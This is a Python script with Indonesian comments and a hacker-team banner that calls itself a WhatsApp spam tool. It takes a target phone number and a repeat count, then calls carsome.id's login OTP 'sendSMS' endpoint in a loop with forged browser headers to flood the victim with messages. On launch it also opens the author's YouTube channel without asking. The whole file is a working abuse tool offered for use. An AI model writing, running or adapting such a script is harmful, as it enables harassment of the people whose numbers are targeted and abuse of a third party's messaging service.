import requests,json,os,time
from requests import post
from requests import get
#Warna
red   = '\x1b[31m' # Merah
green = '\x1b[32m' # Hijau
yellow = '\x1b[33m' # Kuning
blue  = '\x1b[34m' # Biru
magenta = '\x1b[35m' # Ungu
cyan  = '\x1b[36m' # Biru Muda
white = '\x1b[37m' # Putih
reset = '\x1b[39m' # Reset Warna ( Kembali Ke Warna Awal )
brblack = '\x1b[90m' # Hitam Terang
R = '\x1b[91m' # Merah Terang
brgreen = '\x1b[92m' # Hijau Terang
k = '\x1b[93m' # Kuning Terang
brblue = '\x1b[94m' # Biru Terang
brmgnt = '\x1b[95m' # Ungu Terang
brcyan = '\x1b[96m' # Biru Muda Terang
G = '\x1b[97m' # Putih Terang
#system
time.sleep (1)
os.system ("clear")
time.sleep (1)
os.system("xdg-open https://youtube.com/channel/UC683ha2G4DEX24BjigEs7_w")
time.sleep (8)
print("\x1b[96")
banner = """\t_______________________________________
\t dP"Yb  88 8888b.    .d   dP"Yb  .dP"o. 
\tdP   Yb 88 8I   Yb .d88  dP   Yb `8b.d' 
\tYb   dP 88 8I   dY   88  Yb   dP d'`Y8b 
\t YbodP  88 8888Y"    88   YbodP  `bodP' 
\t_______________________________________
\t       Spam WhatsApp No Brutall
\t======================================="""
print (banner)
print ("\x1b[92m")
time.sleep (1)
banner = """==================================================
[+] Author  : OID108 / Mr.DOY108               [+]
[+] Team    : DOY X-PUNTEN                     [+]
[+]           Solo Timur Cyber Team            [+]
[+] Youtube : OID108                           [+]
[+] Github  : https://github.com/oranginisiald [+]
=================================================="""
print (banner)
time.sleep (2)
nomer = input("\x1b[92m[\x1b[91m+\x1b[92m] Nomor \x1b[91m:\x1b[92m0")
time.sleep (1)
jumlah = int(input("\x1b[92m[\x1b[91m+\x1b[92m] Jumlah Max (1) \x1b[91m:\x1b[92m "))

#ini headers
headers = {
'Host': 'www.carsome.id',
'content-length': '1539',
'x-language': 'id',
'x-token': '',
'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36',
'content-type': 'application/json',
'accept': 'application/json, text/plain, */*',
'country': 'ID',
'x-amplitude-device-id': '21_GTvSWdU9mesK2L_ybk1',
'origin': 'https://www.carsome.id',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://www.carsome.id/car-finder/finder-result?list=family&list=Under100m&list=hatchback',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}

#Ini Data
data_test = json.dumps({"username":nomer,"optType":1})

#ini Perintah
for k in range(jumlah):
  k += 1
  pos_pdip = requests.post("https://www.carsome.id/website/login/sendSMS",headers=headers,data=data_test).text
  if "Send successfully" in pos_pdip:
    print("Spam WhatsApp Berhasil")
  else:
    print("Spam WhatsApp Gagal")
